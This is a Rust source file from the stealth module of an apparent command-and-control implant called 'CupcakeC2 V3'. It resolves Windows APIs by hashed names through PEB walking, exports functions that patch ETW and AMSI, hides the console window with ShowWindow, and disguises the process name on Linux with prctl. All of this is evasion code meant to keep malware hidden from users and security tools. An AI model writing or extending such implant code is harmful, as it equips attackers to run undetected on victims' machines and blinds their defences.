// Client/core/src/stealth/mod.rs
// CupcakeC2 V3 Stealth Subsystem

#[cfg(windows)]
pub mod peb;
#[cfg(windows)]
pub mod integrity;
#[cfg(windows)]
pub mod mask;
#[cfg(windows)]
pub mod stack;

#[cfg(windows)]
pub use peb::{get_module_base, get_api_addr};
#[cfg(windows)]
pub use integrity::{patch_etw, patch_amsi};


pub const fn hash_module_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        let mut c = s[i] as u32;
        if c >= b'A' as u32 && c <= b'Z' as u32 {
            c += 32;
        }
        h = h.wrapping_mul(31).wrapping_add(c);
        i += 1;
    }
    h
}

pub const fn hash_api_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
        i += 1;
    }
    h
}

pub fn hide_console() {
    #[cfg(windows)]
    unsafe {
        let h_module = get_module_base(hash_module_name(b"kernel32.dll"));
        let get_console = get_api_addr(h_module, hash_api_name(b"GetConsoleWindow"));
        if let Some(get_console_addr) = get_console {
            let get_console_win: unsafe extern "system" fn() -> usize = std::mem::transmute(get_console_addr);
            let win = get_console_win();
            if win != 0 {
                let user32 = get_module_base(hash_module_name(b"user32.dll"));
                if let Some(show_window) = get_api_addr(user32, hash_api_name(b"ShowWindow")) {
                    let show: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(show_window);
                    show(win, 0); // SW_HIDE
                }
            }
        }
    }
}

pub async fn stealth_sleep(duration_ms: u32) {
    #[cfg(windows)]
    {
        crate::utils::db_print(&format!("[Cupcake] stealth_sleep() called. Temporarily using tokio::time::sleep for {} ms", duration_ms));
        tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
    }
    #[cfg(not(windows))]
    {
        tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
    }
}

pub fn spoof_process_name(name: &str) {
    #[cfg(target_os = "linux")]
    {
        if let Ok(c_name) = std::ffi::CString::new(name) {
            unsafe {
                libc::prctl(15, c_name.as_ptr(), 0, 0, 0);
            }
        }
    }
}
